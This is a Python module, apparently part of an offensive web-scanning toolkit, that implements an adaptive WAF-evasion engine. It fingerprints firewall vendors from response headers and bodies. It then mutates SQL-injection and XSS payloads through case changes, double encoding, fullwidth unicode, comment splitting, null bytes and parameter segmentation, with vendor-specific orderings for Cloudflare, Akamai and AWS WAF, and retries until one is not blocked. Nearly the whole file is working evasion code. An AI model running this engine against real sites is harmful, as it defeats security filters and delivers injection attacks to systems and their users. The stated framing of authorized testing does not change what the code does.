"""WAF-ADAPTIVE PAYLOAD MUTATION ENGINE.

Differentiator #1. Closed loop that other scanners do not have:

    fire payload -> read the block signal (status, body markers, WAF
    headers, timing) -> mutate (case, encoding, unicode, comments,
    segmentation) -> retry, up to N rounds.

Provider API used by injection modules::

    from arsenal.mutate import mutate, classify_block, adaptive_attack

    def fire(payload):
        status, body, headers, elapsed = send_to_target(payload)
        return classify_block(status, body, headers, elapsed)

    for mutated in mutate(payload, fire(payload)):
        ...fire it...

    result = adaptive_attack(payload, fire, max_rounds=5)

Nothing here claims to defeat a real WAF at scale; a burned source IP
stays burned. This is a local, honest mutation engine for single-target
authorized testing, verified against a stub WAF in the test suite.
"""

from __future__ import annotations

import random
import re
import urllib.parse

# ---------------------------------------------------------------------------
# Block signals
# ---------------------------------------------------------------------------

NOT_BLOCKED = "not_blocked"
BLOCKED = "blocked"
CHALLENGE = "challenge"   # captcha / JS challenge / rate limit: retrying now is useless
TIMEOUT = "timeout"       # target stopped responding (possible IPS tarpit)

BLOCK_BODY_MARKERS = (
    "request blocked",
    "blocked by",
    "access denied",
    "access forbidden",
    "forbidden",
    "waf",
    "web application firewall",
    "malicious request",
    "suspicious activity",
    "security policy",
    "request rejected",
    "incident id",
    "ray id",
    "attention required",
    "just a moment",
    "verify you are human",
    "captcha",
    "mod_security",
    "not acceptable",
)

BLOCK_STATUSES = {400, 403, 406, 409, 412, 418, 419, 422, 429, 451, 501, 503}

# Headers that name the WAF vendor. Knowing the vendor steers mutation choice.
WAF_HEADERS = {
    "cf-ray": "cloudflare",
    "cf-mitigated": "cloudflare",
    "x-amz-cf-id": "cloudfront",
    "x-amz-cf-pop": "cloudfront",
    "x-akamai-transformed": "akamai",
    "x-akamai-request-id": "akamai",
    "x-sucuri-id": "sucuri",
    "x-sucuri-cache": "sucuri",
    "x-firewall": "generic",
    "x-waf": "generic",
    "x-protected-by": "generic",
    "server": None,  # value-sniffed below
}
WAF_SERVER_MARKERS = (
    "cloudflare",
    "akamai",
    "awselb",
    "sucuri",
    "incapsula",
    "imperva",
    "f5",
    "big-ip",
    "fortiweb",
    "barracuda",
    "mod_security",
    "aws-waf",
)


class BlockSignal:
    """Outcome of one fired payload."""

    __slots__ = ("verdict", "status", "waf_vendor", "markers", "elapsed")

    def __init__(self, verdict, status=None, waf_vendor=None, markers=(), elapsed=0.0):
        self.verdict = verdict
        self.status = status
        self.waf_vendor = waf_vendor
        self.markers = tuple(markers)
        self.elapsed = elapsed

    def __repr__(self):
        return "BlockSignal(%r, status=%r, waf=%r)" % (
            self.verdict, self.status, self.waf_vendor)


def detect_waf_vendor(headers) -> str | None:
    """Return a vendor name when response headers name a known WAF."""
    if not headers:
        return None
    lowered = {str(k).lower(): str(v) for k, v in dict(headers).items()}
    for name, vendor in WAF_HEADERS.items():
        if name in lowered:
            if vendor:
                return vendor
    server = lowered.get("server", "").lower()
    for marker in WAF_SERVER_MARKERS:
        if marker in server:
            return marker
    powered = lowered.get("x-powered-by", "").lower()
    for marker in WAF_SERVER_MARKERS:
        if marker in powered:
            return marker
    return None


def classify_block(status_code, body="", headers=None, elapsed=0.0,
                   timeout_seconds=30.0) -> BlockSignal:
    """Read the block signal from one fired payload.

    Returns BlockSignal with verdict in {not_blocked, blocked, challenge,
    timeout}. A 403 with WAF markers is blocked; a 403 without markers is
    just forbidden (target said no, not the WAF). Timing far above the
    timeout budget is treated as a tarpit (TIMEOUT).
    """
    if elapsed and timeout_seconds and elapsed >= timeout_seconds * 0.98:
        return BlockSignal(TIMEOUT, status=status_code, elapsed=elapsed)
    body_l = (body or "")[:4000].lower()
    markers = [m for m in BLOCK_BODY_MARKERS if m in body_l]
    vendor = detect_waf_vendor(headers)
    try:
        status = int(status_code)
    except (TypeError, ValueError):
        status = None

    if status == 429 or "captcha" in markers or "verify you are human" in markers:
        return BlockSignal(CHALLENGE, status=status, waf_vendor=vendor,
                           markers=markers, elapsed=elapsed)
    if markers or vendor:
        if status in BLOCK_STATUSES or status is None or markers:
            return BlockSignal(BLOCKED, status=status, waf_vendor=vendor,
                               markers=markers, elapsed=elapsed)
    if status in BLOCK_STATUSES and (vendor or markers):
        return BlockSignal(BLOCKED, status=status, waf_vendor=vendor,
                           markers=markers, elapsed=elapsed)
    return BlockSignal(NOT_BLOCKED, status=status, waf_vendor=vendor,
                       markers=markers, elapsed=elapsed)


# ---------------------------------------------------------------------------
# Mutation strategies
# ---------------------------------------------------------------------------

_SQL_KEYWORDS = ("select", "union", "where", "from", "and", "or", "sleep",
                 "benchmark", "order", "group", "having", "insert", "update",
                 "delete", "drop", "concat", "substring", "information_schema")
_XSS_TOKENS = ("script", "svg", "img", "iframe", "onload", "onerror",
               "alert", "prompt", "confirm", "eval", "javascript")


def _case_vary(payload: str) -> str:
    """Randomize keyword case: SeLeCt, sCrIpT. Breaks case-sensitive rules."""
    out = []
    for ch in payload:
        if ch.isalpha() and random.random() < 0.5:
            out.append(ch.upper() if ch.islower() else ch.lower())
        else:
            out.append(ch)
    return "".join(out)


def _url_encode(payload: str) -> str:
    return urllib.parse.quote(payload, safe="")


def _double_url_encode(payload: str) -> str:
    return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")


def _unicode_overlong(payload: str) -> str:
    """Replace ASCII specials with fullwidth lookalikes / overlong forms.

    Many WAFs match ASCII bytes only; some backends normalize unicode.
    """
    table = str.maketrans({
        "<": "\uff1c", ">": "\uff1e", "'": "\uff07", '"': "\uff02",
        "(": "\uff08", ")": "\uff09", "/": "\uff0f", "=": "\uff1d",
        ";": "\uff1b", " ": "\u00a0",
    })
    return payload.translate(table)


def _comment_inject(payload: str) -> str:
    """SQL: SELECT/**/1. XSS: <scr/**/ipt>. Splits keyword signatures."""
    out = payload
    for kw in _SQL_KEYWORDS:
        out = re.sub(r"(?i)\b%s\b" % kw, lambda m: m.group(0)[:2] + "/**/" + m.group(0)[2:], out)
    out = out.replace("<script", "<scr/**/ipt").replace("<SCRIPT", "<SCR/**/IPT")
    return out


def _whitespace_swap(payload: str) -> str:
    """Swap spaces for tabs/newlines/other separators."""
    return payload.replace(" ", random.choice(("\t", "\n", "\r", "\x0b", "/**/")))


def _html_entity(payload: str) -> str:
    """Encode < > & quotes as HTML entities (XSS context evasion)."""
    return (payload.replace("&", "&amp;").replace("<", "&lt;")
            .replace(">", "&gt;").replace('"', "&quot;").replace("'", "&#x27;"))


def _null_byte(payload: str) -> str:
    return payload.replace("'", "'%00").replace('"', '"%00')


def _mixed_encode(payload: str) -> str:
    """Encode only the dangerous characters, leave the rest readable."""
    dangerous = set("<>'\"()=/; ")
    return "".join(
        ("%%%02X" % ord(c)) if c in dangerous else c for c in payload)


def _keyword_split(payload: str) -> str:
    """Insert a junk token mid-keyword: SEL/**/ECT style for one keyword."""
    m = re.search(r"(?i)(select|union|script|alert|onload|onerror)", payload)
    if not m:
        return payload
    kw = m.group(0)
    cut = len(kw) // 2
    return payload[:m.start()] + kw[:cut] + "/**/" + kw[cut:] + payload[m.end():]


def segment_payload(payload: str, parts: int = 2) -> list[str]:
    """Split a payload across N parameters.

    Some backends concatenate repeated params (?a=<scr&b=ipt>); the WAF
    sees each piece alone. Returns the pieces; the caller places each in
    its own parameter. Honest caveat: only works where the backend joins
    the values, which must be verified per target.
    """
    if parts < 2 or len(payload) < 4:
        return [payload]
    size = max(1, len(payload) // parts)
    pieces = [payload[i:i + size] for i in range(0, len(payload), size)]
    return pieces[:parts] if len(pieces) > parts else pieces


# Strategy table: (name, function, when it is worth trying)
_STRATEGIES = [
    ("case_vary", _case_vary, lambda sig: True),
    ("url_encode", _url_encode, lambda sig: True),
    ("double_url_encode", _double_url_encode,
     lambda sig: sig.verdict == BLOCKED),
    ("unicode_overlong", _unicode_overlong,
     lambda sig: sig.verdict == BLOCKED),
    ("comment_inject", _comment_inject,
     lambda sig: sig.verdict == BLOCKED),
    ("whitespace_swap", _whitespace_swap,
     lambda sig: sig.verdict == BLOCKED),
    ("html_entity", _html_entity,
     lambda sig: sig.verdict == BLOCKED),
    ("null_byte", _null_byte,
     lambda sig: sig.verdict == BLOCKED and sig.status in (None, 403)),
    ("mixed_encode", _mixed_encode, lambda sig: True),
    ("keyword_split", _keyword_split,
     lambda sig: sig.verdict == BLOCKED),
]

# Vendor-aware ordering: cheap, high-yield tricks first per vendor.
_VENDOR_FIRST = {
    "cloudflare": ("case_vary", "mixed_encode", "double_url_encode",
                   "comment_inject", "unicode_overlong"),
    "akamai": ("double_url_encode", "mixed_encode", "case_vary",
               "whitespace_swap", "comment_inject"),
    "aws-waf": ("url_encode", "double_url_encode", "case_vary",
                "comment_inject"),
}


def mutate(payload: str, block_signal: BlockSignal, seed=None):
    """Yield mutated payloads worth trying after a block signal.

    This is the provider API modules call. It is a generator: each item
    is (strategy_name, mutated_payload). Order is vendor-aware when the
    signal names a known WAF, otherwise cheap tricks first. Never yields
    the original payload or duplicates.
    """
    rng = random.Random(seed)
    seen = {payload}
    strategies = list(_STRATEGIES)
    vendor = getattr(block_signal, "waf_vendor", None)
    preferred = _VENDOR_FIRST.get(vendor, ())
    if preferred:
        order = {name: i for i, name in enumerate(preferred)}
        strategies.sort(key=lambda s: order.get(s[0], 99))
    for name, func, worth in strategies:
        if not worth(block_signal):
            continue
        try:
            if name == "case_vary":
                # deterministic-ish: one sample per call is enough
                mutated = func(payload)
            else:
                mutated = func(payload)
        except Exception:
            continue
        if mutated and mutated not in seen:
            seen.add(mutated)
            yield name, mutated
        # second sample for the random strategies adds diversity
        if name in ("case_vary", "whitespace_swap"):
            try:
                again = func(payload)
            except Exception:
                continue
            if again and again not in seen:
                seen.add(again)
                yield name + "_2", again
    # segmentation is last: it changes how the caller must place params
    pieces = segment_payload(payload)
    if len(pieces) > 1 and tuple(pieces) not in seen:
        yield "segment", pieces


def adaptive_attack(payload: str, fire, max_rounds: int = 5, seed=None,
                    stop_on=(CHALLENGE, TIMEOUT)):
    """Full closed loop. fire(payload) -> BlockSignal.

    Returns a dict: {"payload": best_payload, "rounds": [...], "verdict":
    final verdict, "strategy": strategy that worked or None}. Stops early
    on CHALLENGE/TIMEOUT because retrying a captcha or tarpit is useless.
    """
    rounds = []
    first = fire(payload)
    rounds.append({"strategy": "original", "payload": payload,
                   "verdict": first.verdict, "waf": first.waf_vendor,
                   "status": first.status})
    if first.verdict == NOT_BLOCKED:
        return {"payload": payload, "rounds": rounds,
                "verdict": NOT_BLOCKED, "strategy": "original",
                "note": "payload was not blocked; no mutation needed"}
    if first.verdict in stop_on:
        return {"payload": payload, "rounds": rounds,
                "verdict": first.verdict, "strategy": None,
                "note": "stopping: %s is not worth retrying" % first.verdict}
    tried = 0
    for name, mutated in mutate(payload, first, seed=seed):
        if tried >= max_rounds:
            break
        tried += 1
        if isinstance(mutated, (list, tuple)):
            # segmented payloads need caller-side param placement; record only
            rounds.append({"strategy": name, "payload": mutated,
                           "verdict": "needs_param_placement",
                           "note": "split across params; fire manually"})
            continue
        sig = fire(mutated)
        rounds.append({"strategy": name, "payload": mutated,
                       "verdict": sig.verdict, "waf": sig.waf_vendor,
                       "status": sig.status})
        if sig.verdict == NOT_BLOCKED:
            return {"payload": mutated, "rounds": rounds,
                    "verdict": NOT_BLOCKED, "strategy": name}
        if sig.verdict in stop_on:
            return {"payload": mutated, "rounds": rounds,
                    "verdict": sig.verdict, "strategy": name,
                    "note": "stopping on %s" % sig.verdict}
    return {"payload": payload, "rounds": rounds, "verdict": BLOCKED,
            "strategy": None,
            "note": "all %d mutation rounds blocked" % tried}
